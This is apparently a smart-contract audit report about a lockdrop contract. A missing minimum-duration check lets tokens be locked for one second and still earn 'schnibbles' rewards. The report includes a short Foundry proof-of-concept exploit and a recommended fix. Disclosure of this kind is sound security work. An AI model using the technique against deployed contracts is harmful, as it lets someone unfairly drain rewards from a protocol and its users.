# Vulnerability details

## Impact
You can get schnibbles without locking tokens for a minimal amount of time. You can do this when the lockdrop has not started yet or has already ended because if the current `block.timestamp` is outside the `lockdrop` time range, there won't be any check in the `_lock` function to ensure that `lockDuration` is higher than `minLockDuration`.

## Proof of Concept

```solidity
        // Lockdrop will start in 300 seconds so for now lockdrop.start is zero
        lm.setLockDuration(1);
        lm.lock{value: lockAmount}(address(0), lockAmount);
        vm.warp(block.timestamp + 1); // we wait for 1 second
        logPlayer("Player after lock");
        logLockedTokens("After First Lock");
        console.log("Warped to:", block.timestamp);
        // we can unlock it already because unlockTime was lockTime + 1 second
        lm.unlock(address(0), lockAmount);// here we will get unfedSchnibbles even though we've locked tokens for only 1 second.
        logLockedTokens("After Unlock");
        logPlayer("Player after unlock"); 
```

Note: You can paste it in test_SpeedRun, and also, configureLockdrop's start should be delayed for a few seconds so that lockdrop's start would be zero at the moment of code execution.

## Tools Used
Foundry.

## Recommended Mitigation Steps
Add a check to the `setLockDuration` function to ensure that the duration is higher than `minLockDuration`.
